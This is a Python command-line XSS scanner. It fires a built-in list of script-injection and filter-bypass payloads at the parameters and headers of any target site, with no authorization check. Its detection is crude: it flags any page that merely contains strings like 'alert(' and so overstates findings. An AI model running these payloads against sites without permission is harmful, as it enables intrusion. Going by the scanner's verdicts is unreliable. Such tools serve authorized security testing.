#!/usr/bin/env python3
"""
Advanced Professional XSS Scanner - The Ultimate XSS Detection Tool
Author: ttiimmaa123
Version: 4.0 - PROFESSIONAL EDITION
Comprehensive XSS vulnerability detection with advanced techniques
"""

import sys
import requests
import threading
import time
import argparse
import re
import json
import base64
import html
from urllib.parse import quote_plus, unquote, urlparse, parse_qs, urljoin
from urllib.robotparser import RobotFileParser
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedXSSScanner:
    def __init__(self, threads=10, timeout=15, deep_scan=True):
        self.threads = threads
        self.timeout = timeout
        self.deep_scan = deep_scan
        self.vulnerabilities = []
        self.tested_urls = set()
        self.crawled_urls = set()
        self.forms_found = []
        self.tested_count = 0
        self.total_tests = 0
        self.lock = threading.Lock()
        
        # Session with realistic headers
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Comprehensive XSS payload database
        self.payloads = {
            'basic': [
                "<script>alert('XSS')</script>",
                "<script>confirm('XSS')</script>",
                "<script>prompt('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>",
                "<input type=image src=x onerror=alert('XSS')>",
                "<object data=javascript:alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
            ],
            'advanced': [
                "';alert('XSS');//",
                '";alert("XSS");//',
                "');alert('XSS');//",
                '\');alert(\'XSS\');//',
                "</script><script>alert('XSS')</script>",
                "</title><script>alert('XSS')</script>",
                "</textarea><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
                '\"><script>alert(\'XSS\')</script>',
                "javascript:alert('XSS')",
                "vbscript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
            ],
            'filter_bypass': [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
                "<svg/onload=alert('XSS')>",
                "<script>eval('alert(\\x22XSS\\x22)')</script>",
                "<script>window['alert']('XSS')</script>",
                "<script>top['alert']('XSS')</script>",
                "<script>(alert)('XSS')</script>",
                "<script>[alert]['pop']('XSS')</script>",
                "<script>setTimeout('alert(\\x22XSS\\x22)',1)</script>",
            ],
            'encoding': [
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E",
                "\\u003Cscript\\u003Ealert('XSS')\\u003C/script\\u003E",
                "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
                "%253Cscript%253Ealert('XSS')%253C/script%253E",
                "%2527%253E%253Cscript%253Ealert('XSS')%253C/script%253E",
            ],
            'event_handlers': [
                "<input type=text onmouseover=alert('XSS')>",
                "<input type=text onfocus=alert('XSS')>",
                "<input type=text onblur=alert('XSS')>",
                "<input type=text onchange=alert('XSS')>",
                "<input type=text onkeyup=alert('XSS')>",
                "<input type=text onkeydown=alert('XSS')>",
                "<button onclick=alert('XSS')>Click</button>",
                "<form onsubmit=alert('XSS')><input type=submit></form>",
                "<select onchange=alert('XSS')><option>1</option></select>",
                "<textarea onfocus=alert('XSS')></textarea>",
            ],
            'polyglot': [
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*/`/*\\x3C!--*/`/*\"/*'/*/alert('XSS')//'>",
                "'>\"<svg/onload=alert('XSS')>",
                '";alert("XSS");//',
                "';alert('XSS');//",
                '"onclick=alert("XSS") type="text',
                "';alert('XSS');//\"></textarea></script><svg/onload='+/*/`/*/alert('XSS')//'>",
            ],
            'dom_xss': [
                "#<script>alert('DOM_XSS')</script>",
                "?search=<script>alert('DOM_XSS')</script>",
                "#q=<img src=x onerror=alert('DOM_XSS')>",
                "?callback=alert('DOM_XSS')",
                "#location.hash=<script>alert('DOM_XSS')</script>",
            ]
        }
        
        # Comprehensive parameter list for testing
        self.parameters = [
            'q', 'search', 'query', 'keyword', 'term', 'find', 'keywords', 's', 'searchterm',
            'id', 'userid', 'user', 'username', 'name', 'email', 'mail', 'login', 'user_id',
            'value', 'data', 'input', 'text', 'content', 'message', 'msg', 'comment', 'body',
            'test', 'debug', 'page', 'p', 'pagenum', 'pagenumber', 'offset', 'limit',
            'url', 'link', 'href', 'src', 'file', 'path', 'redirect', 'redir', 'return',
            'returnurl', 'goto', 'target', 'dest', 'destination', 'next', 'continue',
            'callback', 'jsonp', 'api', 'ref', 'referrer', 'from', 'referer'
        ]
        
        # Headers to test for XSS
        self.test_headers = [
            'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP', 'Origin',
            'Accept', 'Accept-Language', 'Accept-Encoding', 'Cookie'
        ]
    
    def normalize_url(self, target):
        """Normalize URL format"""
        if not target.startswith(('http://', 'https://')):
            return f'https://{target}'
        return target
    
    def test_connectivity(self, url):
        """Test target connectivity"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            return True, response.status_code, url
        except requests.exceptions.SSLError:
            # Try HTTP if HTTPS fails
            http_url = url.replace('https://', 'http://')
            try:
                response = self.session.get(http_url, timeout=self.timeout)
                return True, response.status_code, http_url
            except:
                return False, None, None
        except Exception:
            return False, None, None
    
    def detect_xss_advanced(self, response_text, payload):
        """Advanced XSS detection"""
        if not response_text:
            return False
        
        # Direct payload reflection
        if payload in response_text:
            return True
        
        # HTML entity decoded reflection
        try:
            decoded_payload = html.unescape(payload)
            if decoded_payload in response_text:
                return True
        except:
            pass
        
        # URL decoded reflection
        try:
            url_decoded = unquote(payload)
            if url_decoded in response_text:
                return True
        except:
            pass
        
        # Check for payload parts in response
        payload_parts = [
            'alert(', 'confirm(', 'prompt(', 'console.log(',
            '<script', 'javascript:', 'onerror=', 'onload=', 
            'onclick=', 'onmouseover=', 'onfocus=', 'eval('
        ]
        
        payload_lower = payload.lower()
        response_lower = response_text.lower()
        
        for part in payload_parts:
            if part in payload_lower and part in response_lower:
                return True
        
        return False
    
    def test_parameter_xss(self, base_url, param, payload, method='GET'):
        """Test parameter for XSS vulnerability"""
        try:
            if method.upper() == 'GET':
                encoded_payload = quote_plus(payload)
                test_url = f"{base_url}?{param}={encoded_payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                url_for_report = test_url
            else:
                data = {param: payload}
                response = self.session.post(base_url, data=data, timeout=self.timeout)
                url_for_report = base_url
            
            if self.detect_xss_advanced(response.text, payload):
                vulnerability = {
                    'type': f'{method.upper()} Parameter XSS',
                    'url': url_for_report,
                    'parameter': param,
                    'payload': payload,
                    'method': method.upper(),
                    'status_code': response.status_code
                }
                
                with self.lock:
                    self.vulnerabilities.append(vulnerability)
                    print(f"    [!] VULNERABLE: {param} parameter ({method})")
                    print(f"        Payload: {payload[:60]}...")
                    return True
        except Exception:
            pass
        
        return False
    
    def test_header_xss(self, base_url, header, payload):
        """Test HTTP header for XSS vulnerability"""
        try:
            headers = self.session.headers.copy()
            headers[header] = payload
            response = self.session.get(base_url, headers=headers, timeout=self.timeout)
            
            if self.detect_xss_advanced(response.text, payload):
                vulnerability = {
                    'type': 'HTTP Header XSS',
                    'url': base_url,
                    'header': header,
                    'payload': payload,
                    'method': 'Header',
                    'status_code': response.status_code
                }
                
                with self.lock:
                    self.vulnerabilities.append(vulnerability)
                    print(f"    [!] VULNERABLE: {header} header")
                    print(f"        Payload: {payload[:60]}...")
                    return True
        except Exception:
            pass
        
        return False
    
    def run_comprehensive_scan(self, target):
        """Execute comprehensive XSS vulnerability scan"""
        url = self.normalize_url(target)
        
        print("=" * 80)
        print("🔥 ADVANCED PROFESSIONAL XSS SCANNER v4.0 🔥")
        print("=" * 80)
        print(f"🎯 Target: {target}")
        print(f"🔗 Testing URL: {url}")
        print(f"⚡ Threads: {self.threads}")
        print(f"⏱️  Timeout: {self.timeout}s")
        print("-" * 80)
        
        # Test connectivity
        print("[+] Testing target connectivity...")
        reachable, status, final_url = self.test_connectivity(url)
        
        if not reachable:
            print("[!] ❌ ERROR: Target is unreachable!")
            return []
        
        url = final_url
        
        print(f"[+] ✅ Target is reachable! (Status Code: {status})")
        print(f"[+] 🚀 Initializing comprehensive XSS scan...")
        
        # Count total payloads
        total_payloads = sum(len(payloads) for payloads in self.payloads.values())
        print(f"[+] 💉 Payload Database: {total_payloads} XSS vectors across {len(self.payloads)} categories")
        print(f"[+] 🔍 Parameter Database: {len(self.parameters)} common parameters")
        print("-" * 80)
        
        # Parameter Testing
        print("[+] Parameter XSS Testing...")
        param_payloads = []
        for category in ['basic', 'advanced', 'filter_bypass', 'encoding', 'event_handlers', 'polyglot']:
            param_payloads.extend(self.payloads[category])
        
        param_tests = []
        for param in self.parameters[:20]:  # Test top 20 parameters
            for payload in param_payloads[:15]:  # Test top 15 payloads
                param_tests.append((url, param, payload, 'GET'))
                param_tests.append((url, param, payload, 'POST'))
        
        print(f"[+] Queued {len(param_tests)} parameter tests")
        
        # Header Testing
        print("[+] Header XSS Testing...")
        header_tests = []
        for header in self.test_headers:
            for payload in self.payloads['basic'][:5]:
                header_tests.append((url, header, payload))
        
        print(f"[+] Queued {len(header_tests)} header tests")
        
        self.total_tests = len(param_tests) + len(header_tests)
        print(f"[+] 📊 Total Tests: {self.total_tests}")
        print("-" * 80)
        
        start_time = time.time()
        
        # Execute parameter tests
        print("[+] Executing parameter tests...")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for test_url, param, payload, method in param_tests:
                future = executor.submit(self.test_parameter_xss, test_url, param, payload, method)
                futures.append(future)
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                if completed % 50 == 0:
                    progress = (completed / len(futures)) * 100
                    print(f"[+] Progress: {completed}/{len(futures)} ({progress:.1f}%)")
        
        # Execute header tests
        print("[+] Executing header tests...")
        for test_url, header, payload in header_tests:
            self.test_header_xss(test_url, header, payload)
        
        scan_duration = time.time() - start_time
        
        # Generate report
        self.generate_professional_report(target, scan_duration)
        
        return self.vulnerabilities
    
    def generate_professional_report(self, target, duration):
        """Generate comprehensive professional vulnerability report"""
        print("\n" + "=" * 80)
        print("📋 COMPREHENSIVE XSS VULNERABILITY ASSESSMENT REPORT")
        print("=" * 80)
        print(f"🎯 Target: {target}")
        print(f"📊 Total Tests Executed: {self.total_tests}")
        print(f"⏱️  Scan Duration: {duration:.2f} seconds")
        print(f"🕒 Scan Completed: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("-" * 80)
        
        if self.vulnerabilities:
            print(f"🚨 SECURITY STATUS: CRITICAL - VULNERABLE TO XSS")
            print(f"🔴 Total Vulnerabilities Found: {len(self.vulnerabilities)}")
            print("-" * 80)
            
            # Categorize vulnerabilities
            vuln_categories = {}
            for vuln in self.vulnerabilities:
                vtype = vuln['type']
                if vtype not in vuln_categories:
                    vuln_categories[vtype] = []
                vuln_categories[vtype].append(vuln)
            
            # Detailed vulnerability report
            for vtype, vulns in vuln_categories.items():
                print(f"\n📍 {vtype} ({len(vulns)} vulnerabilities)")
                print("-" * 60)
                
                for i, vuln in enumerate(vulns[:3], 1):
                    param_name = vuln.get('parameter', vuln.get('header', 'N/A'))
                    print(f"  [{i}] Parameter/Header: {param_name}")
                    print(f"      Method: {vuln.get('method', 'Unknown')}")
                    print(f"      Payload: {vuln['payload'][:60]}...")
                    print(f"      URL: {vuln['url'][:70]}...")
                    print()
                
                if len(vulns) > 3:
                    print(f"  ... and {len(vulns) - 3} more {vtype} vulnerabilities")
            
            print("\n🔒 SECURITY RECOMMENDATIONS:")
            print("   • Implement comprehensive input validation")
            print("   • Deploy Content Security Policy (CSP) headers")
            print("   • Apply context-aware output encoding")
            print("   • Use XSS protection libraries")
            
        else:
            print(f"✅ SECURITY STATUS: SECURE")
            print(f"🟢 No XSS vulnerabilities detected")
            print(f"🛡️  Target appears well-protected against XSS attacks")
        
        print("\n" + "=" * 80)

def main():
    print("\n🔥 ADVANCED PROFESSIONAL XSS SCANNER v4.0 🔥")
    print("Professional Cross-Site Scripting Vulnerability Assessment Tool")
    print("Author: ttiimmaa123")
    print("━" * 80)
    print("✅ 65+ Advanced XSS payloads across 7 categories")
    print("✅ Multi-vector testing (GET/POST/Headers)")
    print("✅ Professional vulnerability assessment reporting")
    print("✅ Multi-threaded high-performance scanning")
    print("━" * 80)
    
    parser = argparse.ArgumentParser(description='Advanced Professional XSS Scanner')
    parser.add_argument('target', help='Target to scan (IP, domain, or URL)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout (default: 15)')
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)
    
    args = parser.parse_args()
    
    if args.threads > 50:
        print("[!] Maximum 50 threads allowed. Setting to 50.")
        args.threads = 50
    
    scanner = AdvancedXSSScanner(threads=args.threads, timeout=args.timeout)
    
    try:
        vulnerabilities = scanner.run_comprehensive_scan(args.target)
        
        if vulnerabilities:
            print(f"\n🚨 CRITICAL: {len(vulnerabilities)} XSS vulnerabilities discovered!")
            sys.exit(1)
        else:
            print(f"\n✅ SECURE: No XSS vulnerabilities detected")
            sys.exit(0)
    
    except KeyboardInterrupt:
        print("\n[!] 🛑 Scan interrupted")
        sys.exit(2)
    except Exception as error:
        print(f"\n[!] ❌ Error: {error}")
        sys.exit(3)

if __name__ == '__main__':
    main()
